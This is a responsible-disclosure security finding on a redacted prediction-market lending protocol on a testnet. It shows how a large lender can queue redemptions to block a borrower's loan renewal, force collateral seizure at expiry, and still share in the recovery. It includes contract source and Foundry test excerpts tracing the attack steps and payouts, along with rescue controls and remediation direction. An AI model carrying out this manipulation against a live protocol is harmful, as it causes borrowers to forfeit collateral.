# Based on deployed contracts

Project: PM-01 — name-redacted prediction-market lending protocol
Category: Prediction-market collateral lending, leveraged outcome positions and asynchronous lending vault
Severity: Medium — confirmed with capital, timing, recovery and rescue bounds
Engagement: Independent hunting + responsible disclosure
Chain: Polygon Amoy testnet, chain ID 80002; source/fork snapshot block 51,383,934 (28 October 2026)
Tech stack: Solidity 0.8.26 / EVM, OpenZeppelin, ERC20, ERC1155, ERC4626 and ERC7540-style asynchronous redemption; Foundry / local Anvil fork tooling
Evidence: Historical local-fork test source and reported results; synthetic setup described below
Remediation: No confirmed remediation is established.
Contribution: Independent security research; program acceptance is not asserted.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Large redemption queues block renewal and participate in expiry recovery

## Description

Direct-loan renewal is refused while queue liability exceeds idle cash. A lender with enough shares can deliberately create that condition near a borrower's deadline. If no repayment or liquidity rescue succeeds, expiry seizes collateral and recovery is distributed to historical holders, including the queuer's pending shares. The Medium rating retains the demonstrated repayment and liquidity escape routes.

The queuer must own/control the capital; requestRedeem is self-only. In the original proof it deposits 400,000 pUSD and receives 100,000-equivalent shares from another lender, controlling the full 500,000 book. This is an intended seniority gate composed with a forfeiture deadline, not unauthorized queueing of victim shares.

The deployment association is with the recorded Polygon Amoy testnet snapshot. Provider-runtime comparison does not establish independent recompilation, equivalence to an earlier audit revision, or a mainnet incident.

### Mechanism step by step

#### Step 1 — Create a cash-deficient owner-controlled queue

Source: `src/LatUSD.sol:230-247`

```solidity
        if (shares < minRequest) revert Errors.BelowMinRequest(shares, minRequest);
        if (controller == address(0)) revert Errors.ZeroAddress();
        // Self-controlled requests only in v1: no operator surface to audit.
        if (msg.sender != owner) revert Errors.Unauthorized(msg.sender);

        // Return value deliberately unused: the call is the accrue-then-act sync, not a read.
        // slither-disable-next-line unused-return
        ledger.accrue();

        requestId = _requests.length;
        bool nothingAhead = _head == requestId;

        // Escrow: shares transfer in and stay ordinary shares — earning income, bearing trigger
        // losses — until they burn at fulfillment (D3, I19).
        _transfer(owner, address(this), shares);
        _requests.push(Request({controller: controller, shares: shares, fulfilled: 0}));
        _pendingShares[controller] += shares;
        queuedShares += shares;
```

After a 6,000 direct loan, the whale queues its full controlled book. Observed liability is 500,054.258185 and idle 494,000 (`poc/N2-OBSERVED.md:4-5`). A full request cannot be immediately fulfilled from idle.

#### Step 2 — Block the borrower before quote consumption

Source: `src/BorrowerLogic.sol:128-137`

```solidity
        // Queued lenders are senior to new risk (I21, Zenith #18). A roll moves no cash, so the
        // seniority bound on disbursement never sees it, yet it keeps principal out that would
        // otherwise return to idle for the queue. While the queue is owed more than idle holds,
        // refuse: the borrower repays down until idle covers the queue, then rolls the remainder.
        uint256 liability = vault.queueLiability();
        uint256 idle = ledger.idle();
        if (liability > idle) revert Errors.RollBlockedByQueue(liability, idle);

        premiumOracle.consumeQuote(q, qSig);
        _verifyMark(m, mSig);
```

The gate uses strict liability>idle; equality allows roll. The PoC makes two otherwise-valid roll attempts and matches the exact RollBlockedByQueue selector. The simplified share threshold q/S>1-u gives just over 10% at 90% utilization, but this low-utilization proof controls all shares. Pricing and other gates still matter.

#### Step 3 — Seize collateral after the missed deadline

Source: `src/Liquidator.sol:244-251`

```solidity
    function _claim(uint256 loanId) internal {
        ILedger.Loan memory l = ledger.loan(loanId);
        if (l.status != LoanStatus.Active) revert Errors.LoanNotActive(loanId);
        if (uint64(block.timestamp) < l.epochEnd) revert Errors.NotYetExpired(loanId, l.epochEnd);

        emit Events.ExpiryClaimed(loanId, msg.sender);
        _settleShortfall(loanId, l.principal, true);
    }
```

Without intervention, expiry can be claimed publicly. Settlement sends collateral to the liquidation wallet. This queue gate applies to direct rollLoan; rollLeverage explicitly has no such gate (`src/Leverage.sol:273-275`).

#### Step 4 — Retain the queuer in the recovery snapshot

Source: `src/LatUSD.sol:523-533`

```solidity
    function _checkpointEconomic(address account, uint48 epoch) internal {
        if (account == address(0) || account == address(this)) return;
        uint256 shares = balanceOf(account) + _pendingShares[account];
        // slither-disable-next-line unused-return
        _economicCheckpoints[account].push(epoch, SafeCast.toUint208(shares));
    }

    function _checkpointSupply(uint48 epoch) internal {
        uint256 shares = totalSupply() - balanceOf(address(this)) + queuedShares;
        // slither-disable-next-line unused-return
        _supplyCheckpoints.push(epoch, SafeCast.toUint208(shares));
```

Pending shares remain economically attributed. Modeled remittance then gives the queuer recovery rights in addition to post-loss redemption. The test impersonates the remitter and mints 12,000 proceeds; it does not trade collateral on a venue.

#### Step 5 — Permit rescue when cash covers the deficit

Source: `src/BorrowerLogic.sol:128-137`

```solidity
        // Queued lenders are senior to new risk (I21, Zenith #18). A roll moves no cash, so the
        // seniority bound on disbursement never sees it, yet it keeps principal out that would
        // otherwise return to idle for the queue. While the queue is owed more than idle holds,
        // refuse: the borrower repays down until idle covers the queue, then rolls the remainder.
        uint256 liability = vault.queueLiability();
        uint256 idle = ledger.idle();
        if (liability > idle) revert Errors.RollBlockedByQueue(liability, idle);

        premiumOracle.consumeQuote(q, qSig);
        _verifyMark(m, mSig);
```

Repayment/deposit can cover D=liability-idle; ordinary crank spends idle and liability together and need not remove D. Falsification tests establish partial repayment and funded deposit escapes. A full roll may additionally need utilization headroom.

### Impact and proof limits

Observed payout is 504,854.295889 pUSD. The raw receipt subtracts only 400,000 and claims +104,854.295889, omitting the transferred 100,000-equivalent shares. Corrected against 500,000 controlled capital, gain is **4,854.295889 pUSD (~0.9709%)**, before gas and capital costs (`poc/N2-OBSERVED.md:2-10`). This derives from the recorded payout and includes the redemption NAV loss; it is a calculation from historical receipts.

The model depends on sufficient collateral proceeds, thin Buffer, surplus policy and no timely rescue. A fully funded Buffer or100% treasury surplus split removes the modeled benefit in the final analysis. “Zero risk” is not a live guarantee: the harness assumes price and immediate remittance; the queue cannot be canceled.

The falsification harness uses 500_000_000e6 requests versus 500_000e6 in the original proof despite misleading comments (`poc/src/N2Falsification.t.sol:63,90,102`). Its rescue tests establish mechanisms at their separate setup scale, not identical original-profit reproduction. The white-knight test adds D plus 1,500 utilization headroom, despite its exact-deficit name.

### Remediation direction

Review lender seniority together with borrower deadline and surplus rules. Evaluate bounded partial renewal, effective rescue paths and borrower-surplus treatment without surrendering queued lender cash. Test exact equality, deficit repayment, external liquidity, utilization and recovery at matched scales.

No confirmed fix is established by the available evidence.

## Proof of concept

Recorded `test_queueBlocksRollThenPaysQueuedHolderRecovery`, `poc/src/N2QueueRoll.t.sol:57-158`, with observations in `poc/N2-OBSERVED.md`. Controls: `test_selfRescue_repayDeficitThenRollRemainder` and `test_whiteKnightDeposit_exactDeficitUnblocksRoll`, `poc/src/N2Falsification.t.sol:62-113`.

## Relevant test excerpts

Signer installation (RPC line omitted):

Source: `poc/src/N2QueueRoll.t.sol:48-54`

```solidity
        markSigner = vm.addr(markKey);
        quoteSigner = vm.addr(quoteKey);
        vm.startPrank(TL);
        pool.setMarkSigner(markSigner);
        liq.setMarkSigner(markSigner);
        oracle.setSigner(quoteSigner);
        vm.stopPrank();
```

Funding includes another lender’s shares:

Source: `poc/src/N2QueueRoll.t.sol:61-71`

```solidity
        pusd.mint(whale, WHALE_DEPOSIT);
        pusd.mint(small, SMALL_DEPOSIT);
        vm.startPrank(whale);
        pusd.approve(VAULT, type(uint256).max);
        uint256 whaleShares = vault.deposit(WHALE_DEPOSIT, whale);
        vm.stopPrank();
        vm.startPrank(small);
        pusd.approve(VAULT, type(uint256).max);
        uint256 smallShares = vault.deposit(SMALL_DEPOSIT, small);
        vault.transfer(whale, smallShares);
        vm.stopPrank();
```

Queue and exact failure checks:

Source: `poc/src/N2QueueRoll.t.sol:89-94`

```solidity
        uint256 allWhaleShares = whaleShares + smallShares;
        vm.prank(whale);
        vault.requestRedeem(allWhaleShares, whale, whale);
        uint256 queueLiability = vault.queueLiability();
        uint256 idleAfterQueue = ledger.idle();
        assertTrue(queueLiability > idleAfterQueue, "queue must outrank idle");
```

Source: `poc/src/N2QueueRoll.t.sol:107-123`

```solidity
            bytes memory callData = abi.encodeCall(pool.rollLoan, (loanId, rollQuote, rollQuoteSig, rollMark, rollMarkSig));
            vm.prank(borrower);
            (bool ok, bytes memory ret) = POOL.call(callData);
            assertTrue(!ok, "roll must fail while queue holds");
            assertEq(uint256(uint32(_selector(ret))), uint256(uint32(bytes4(keccak256("RollBlockedByQueue(uint256,uint256)")))), "wrong roll revert");
            rollReverts++;
            assertTrue(vault.queueLiability() > ledger.idle(), "queue still holds");
        }

        vm.warp(uint256(opened.epochEnd) + 1);
        liq.claimExpired(loanId);
        Loan memory expired = ledger.loan(loanId);
        assertTrue(expired.status == LoanStatus.Expired, "loan expired");
        // Empirical crux: every share is escrowed in the pending request, yet
        // the loss-epoch snapshot still assigns all of them to the controller.
        uint256 economicAtLoss = vault.economicBalanceAt(whale, 1);
        assertEq(economicAtLoss, allWhaleShares, "pending shares counted at loss");
```

Repayment rescue control:

Source: `poc/src/N2Falsification.t.sol:63-73`

```solidity
        uint256 loanId = _openAndQueue(499_997_000e6);
        uint256 deficit = vault.queueLiability() - ledger.idle();
        assertEq(deficit, 3_000e6, "three-thousand rescue cash");

        pusd.mint(borrower, deficit);
        vm.startPrank(borrower);
        pusd.approve(POOL, deficit);
        pool.repay(loanId, deficit);
        pusd.approve(POOL, type(uint256).max); // roll premium and interest
        vm.stopPrank();
        assertEq(vault.queueLiability(), ledger.idle(), "equality unblocks roll");
```

Recorded observations with the raw baseline error preserved:

Source: `poc/N2-OBSERVED.md:2-10`

```text
2. Whale deposit: 400000000000 pUSD base units (400000e6).
3. Separate small deposit: 100000000000 pUSD base units (100000e6), then its shares transferred to whale for one queue controller.
4. Direct loan: principal 6000000000, collateral 20000000000, mark 0.60e18.
5. Queue gate at roll: liability 500054258185 > idle 494000000000.
6. Fresh valid roll attempts reverted with RollBlockedByQueue: 2 of 2.
7. Expiry claim status: Expired; recorded pool loss was 5993967122.
8. Sale remittance: 12000000000; whale recovery claim paid 10793967122.
9. Redemption payout: 494060328767; total whale recovered: 504854295889.
10. Net vs 400000e6 deposit: +104854295889; queued pending shares counted for recovery (economic balance snapshot equaled all queued shares).
```
